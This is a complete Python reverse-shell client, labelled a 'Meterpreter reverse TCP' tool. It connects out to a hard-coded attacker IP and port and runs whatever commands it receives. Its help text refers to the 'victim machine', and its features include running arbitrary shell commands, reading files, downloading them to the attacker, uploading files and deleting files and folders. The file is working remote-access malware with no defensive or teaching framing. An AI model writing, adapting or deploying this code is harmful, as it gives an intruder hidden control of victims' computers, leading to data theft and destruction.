import socket                                           # ABHIJITH K A
import os                                               # METERPRETER REVERSE TCP
import subprocess                                       # 19 AUG 2017


s = socket.socket()

host = "192.168.1.105"     # Change this host to the ip address of your system

port = 5555                # Change the port number as your wish, make sure to port forward the same port in router

s.connect((host, port))

while True:

    command = s.recv(1024).decode()

    command = str(command)

    # Command ===> mkdir ===> To make folder

    if command[0:5] == "mkdir" and command[5:6] == " ":

        folder = command[6:]

        if os.path.exists(os.getcwd() + "/" + folder):

            msg = "[-] Folder ==> '" + folder + "' already exists" + " at " + os.getcwd()

            s.send(msg.encode())

        else:

            os.mkdir(os.getcwd() + "/" + folder)

            msg = "[+] Folder created ==> '" + folder + "' at " + os.getcwd()

            s.send(msg.encode())

    # Command ===> rmdir ===> To remove(delete) folder

    elif command[0:5] == "rmdir" and command[5:6] == " ":

        folder = command[6:]

        if os.path.exists(os.getcwd() + "/" + folder):

            os.rmdir(folder)

            msg = "[+] Folder ==> '" + folder + "' has deleted " + " from " + os.getcwd()

            s.send(msg.encode())

        else:

            msg = "[-] Folder ==> '" + folder + "' does not exists in " + os.getcwd()

            s.send(msg.encode())

    # Command ===> chdir ===> To get the current working directory

    elif command == "chdir":

            msg = os.getcwd()

            s.send(msg.encode())

    # Command ===> enter ===> To change directory

    elif command[0:5] == "enter" and command[5:6] == " ":

            path = command[6:]

            if os.path.exists(path):

                os.chdir(path)

                msg = "[+] Entered into Path ==> '" + path + "'"

                s.send(msg.encode())

            else:

                msg = "[-] Path ==> '" + path + "' does not exists!"

                s.send(msg.encode())

    # Command ===> ls ===> To list files and folders in a the current directory

    elif command == "ls":

        list = str(os.listdir(os.getcwd()))

        s.send(list.encode())

    # Command ===> help or ? ===> To list the help menu

    elif command == "help" or command == "?":

        help = " mkdir ==> To make folders \n rmdir ==> To delete folders \n ls    ==> To list items in a folder \n chdir ==> To print the current working directory \n enter ==> To change directory \n exit  ==> To quit the meterpreter session \n shell ==> Enter into the shell \n read  ==> Read a file and displays it \n download ==> To download a file \n upload ==> To upload a file \n rm    ===> Remove a file \n \n [i] Use 'help <command>' to know about a command."

        s.send(help.encode())

    # Command ===> exit ===> To exit meterpreter

    elif command[:4] == "help" and command[4:5] == " " and len(command.split(" ")) == 2:

        cmd = command.split(" ")[1]

        if cmd == "mkdir":

            msg = " [i] Usage: mkdir <folder name> \n \n It is used to create folder in the victim machine."

            s.send(msg.encode())

        elif cmd == "rmdir":

            msg = " [i] Usage: rmdir <folder name> \n \n It is used to delete folders from victim machine."

            s.send(msg.encode())

        elif cmd == "ls":

            msg = " [i] Usage: ls \n \n It is used to list items in the current directory"

            s.send(msg.encode())

        elif cmd == "chdir":

            msg = " [i] Usage: chdir <path> \n \n It is used to print current working directory in the victim machine"

            s.send(msg.encode())

        elif cmd == "enter":

            msg = " [i] Usage: enter <path> \n \n It is used to change directory"

            s.send(msg.encode())

        elif cmd == "exit":

            msg = " [i] Usage: exit \n \n It is used to exit the meterpreter reverse shell"

            s.send(msg.encode())

        elif cmd == "shell":

            msg = " [i] Usage: shell \n \n It is used to enter into the system shell of the victim machine"

            s.send(msg.encode())

        elif cmd == "read":

            msg = " [i] Usage: read <filename> \n \n It is used to print out the content in a file to the screen"

            s.send(msg.encode())

        elif cmd == "download":

            msg = " [i] Usage: download <filename> <destination> \n \n It is used to download a single file at a time from the victim machine to the \n attacker machine's given destination"

            s.send(msg.encode())

        elif cmd == "upload":

            msg = " [i] Usage: upload <filename> <destination> \n \n It is used to upload a single file at a time from the attacker machine to the \n victim machine's given destination"

            s.send(msg.encode())

        elif cmd == "rm":

            msg = " [i] Usage: rm <filename> \n \n It is used to remove(delete) the specified file from the victim machine"

            s.send(msg.encode())

        else:

            msg = " [-] That command doesn't exists! Use 'help' or '?' to see the command list"

            s.send(msg.encode())

    elif command == "exit":

        s.close()

        break

    # Command ===> shell ===> To enter into the system shell

    elif command == "shell":

        msg = "shellX"

        s.send(msg.encode())

        while True:

            com = str(s.recv(1024).decode())

            if com == "exit":

                break

            else:

                try:

                    output = subprocess.check_output(com,
                                              shell=True,
                                              stderr=subprocess.PIPE,
                                              stdin=subprocess.PIPE)

                    if output.decode() == "":

                        s.send("[+] Command Executed".encode())

                    else:

                        s.send(output)

                except:

                    s.send("[-] Invalid Command".encode())

    # Command ===> read ===> To type out the lines in a file  on to the screen

    elif command[0:4] == "read" and command[4:5] == " ":

        file = command[5:]

        if os.path.exists(file):

            edit = open(file, "r")

            data = edit.read()

            data = str(data)

            s.send(data.encode())

            edit.close()

        else:

            msg = "[-] No file named ==> '" + file + "'"

            s.send(msg.encode())

    # Command ===> download ===> To download a file from the victim(target) machine

    elif command[0:8] == "download" and command[8:9] == " ":

        file = command.split(" ")[1]

        if os.path.isfile(file):

            msg = "EXISTS " + str(os.path.getsize(file))

            s.send(msg.encode())

            with open(file, 'rb') as f:

                bytesToSend = f.read(1024)

                s.send(bytesToSend)

                while bytesToSend.strip() != b"":

                    bytesToSend = f.read(1024)

                    s.send(bytesToSend)

                f.close()

        else:

            s.send("ERR ".encode())

    elif command[:6] == "upload" and command[6:7] == " " and len(command.split(" ")) == 3:

        file = command.split(" ")[1]

        destination = command.split(" ")[2]

        if os.path.exists(destination):

            s.send("OK".encode())

            filesize = int(s.recv(1024).decode())

            upload = open(destination + file, "wb")

            data = s.recv(1024)

            upload.write(data)

            total = len(data)

            while total < filesize:

                data = s.recv(1024)

                upload.write(data)

                total += len(data)

            upload.close()

            if os.path.isfile(destination + file):

                msg = "[+] The file '" + file + "' has uploaded to ==> " + destination + file

                s.send(msg.encode())

            else:

                msg = "[-] An error occured, the file is not uploaded"

                s.send(msg.encode())

        else:

            s.send("ERR".encode())

    elif command[0:2] == "rm" and command[2:3] == " ":

        file = command[3:]

        if os.path.exists(file):

            os.remove(file)

            msg = "[+] The file '" + file + "' is removed"

            s.send(msg.encode())

        else:

            msg = "[-] The file '" + file + "' doesnt exists"

            s.send(msg.encode())

    else:

        msg = "[-] Invalid Command! Type 'help' or '?' for listing the available options."

        s.send(msg.encode())
